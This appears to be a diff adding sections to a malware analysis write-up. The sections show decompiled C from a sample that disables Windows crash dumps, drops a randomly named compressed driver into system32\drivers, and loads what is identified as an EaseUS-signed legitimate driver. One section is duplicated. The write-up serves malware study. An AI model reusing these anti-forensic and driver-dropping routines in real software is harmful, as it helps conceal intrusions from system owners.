@@ -360,6 +360,140 @@ Now, disable Windows file system redirection
     Wow64DisableWow64FsRedirection((PVOID *)&v31);
   phkResult = 0;
 ```
+<br /><br />
+Disable Windows crash dump
+
+```c
+  if ( !RegOpenKeyW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\CrashControl", &phkResult) )
+  {
+    *(_DWORD *)Data = 0;
+    RegSetValueExW(phkResult, L"CrashDumpEnabled", 0, 4u, Data, 4u);
+    RegCloseKey(phkResult);
+  }
+```
+<br /><br />
+Create random file with in the system32\drivers (interesting)
+
+```c
+  wnsprintfW(Destination, 260, L"\\\\.\\EPMNTDRV\\%u", 0);
+  v10 = (void *)sub_401870(Destination, 0, 0);
+  if ( !v10 || v10 == (void *)-1 )
+  {
+    *(_DWORD *)Data = &pszDest[v38];
+    if ( GetSystemDirectoryW(*(LPWSTR *)Data, 0x104u) )
+    {
+      PathAppendW(pszDest, L"Drivers");
+      PathAddBackslashW(pszDest);
+      v38 = 26;
+      v12 = &pszDest[wcslen(pszDest)];
+      do
+      {
+        v32[0] = 6422625;
+        v32[1] = 6553699;
+        v32[2] = 6684773;
+        v32[3] = 6815847;
+        v32[4] = 6946921;
+        v32[5] = 7077995;
+        v32[6] = 7209069;
+        v32[7] = 7340143;
+        v32[8] = 7471217;
+        v32[9] = 7602291;
+        v32[10] = 7733365;
+        v32[11] = 7864439;
+        v32[12] = 7995513;
+        v13 = GetCurrentProcessId();
+        v14 = (v13 + 1) % 0xFFF1;
+        *v12 = *((_WORD *)v32 + (v14 + ((v14 % 0xFFF1) << 16)) % v38);
+        v12[1] = *((_WORD *)v32
+                 + ((v14 + v13) % 0xFFF1 + (((v14 % 0xFFF1 + (v14 + v13) % 0xFFF1) % 0xFFF1) << 16)) % 0x1A);
+        StrCatBuffW(v12 + 1, L"drv", 4);
+        v12[6] = 0;
+      }
+      while ( PathFileExistsW(pszDest) );
+      v15 = PathFindExtensionW(v12) - v12;
+      wcsncpy(Destination, v12, v15);
+      v16 = *(WCHAR **)Data;
+      Destination[v15] = 0;
+      v17 = CreateFileW(v16, 0x40000000u, 0, 0, 2u, 0, 0);
+      v18 = (void (__stdcall *)(LPCWSTR))DeleteFileW;
+      v19 = v17;
+      if ( v17 && v17 != (HANDLE)-1 )
+      {
+        phkResult = 0;
+        if ( WriteFile(v17, lpBuffer, nNumberOfBytesToWrite, (LPDWORD)&phkResult, 0)
+          && phkResult == (HKEY)nNumberOfBytesToWrite )
+        {
+          if ( v19 != (void *)-1 )
+          {
+            FlushFileBuffers(v19);
+            CloseHandle(v19);
+          }
+        }
+        else
+        {
+          CloseHandle(v19);
+          DeleteFileW(v16);
+        }
+      }
+```
+<br /><br />
+The dropped random file name (will be the driver.sys)
+
+```sh
+$ file dbdr
+dbdr: MS Compress archive data, SZDD variant, original size: 17480 bytes
+```
+<br /><br />
+The dropped random file name (will be the driver.sys)
+
+```sh
+$ file dbdr
+dbdr: MS Compress archive data, SZDD variant, original size: 17480 bytes
+```
+<br /><br />
+expand it on windows
+
+```sh
+$ expand dbdr driver
+```
+<br /><br />
+
+driver is legit 
+```
+    "General": {
+        "PE Type": "driver",
+        "Entrypoint": "24584",
+        "Entrypoint Section": "INIT",
+        "Header checksum": "0xc37c",
+        "Verify checksum": "0xc37c",
+        "Match checksum": "True",
+        "Sig": "488b05f1e0ffff49b932a2df2d992b00004885c07405493bc1752f4c8d05d6e0ffff48b82003000080f7ffff488b004933c049b8",
+        "imphash": "5bba6eb3fccad3d563d56ef2d7e5d5e8",
+        "warning": [
+            "Suspicious flags set for section 4. Both IMAGE_SCN_MEM_WRITE and IMAGE_SCN_MEM_EXECUTE are set. This might indicate a packed executable."
+        ],
+        "Timestamp": "2008-08-14 18:11:21"
+    },
+```
+<br /><br />
+
+driver sig is EaseUS
+```sh
+    "SignatureExtracted": {
+        "CERT_0": {
+            "CommonName": "CHENGDU YIWO Tech Development Co., Ltd.",
+            "OrganizationalUnit": "Digital ID Class 3 - Microsoft Software Validation v2",
+            "Organization": "CHENGDU YIWO Tech Development Co., Ltd.",
+            "Locality": "Chengdu",
+            "StateOrProvinceName": "None",
+            "CountryName": "CN",
+            "Start": "Apr 23 00:00:00 2012 GMT",
+            "Ends": "Sep 11 23:59:59 2014 GMT",
+            "SerialNumber": "68804683173832892932091550486902617573",
+            "SerialNumberMD5": "705edf5c1af78770de4153bccb757055"
+        }
+    },
+```
 
 ## Dumped 
 ```
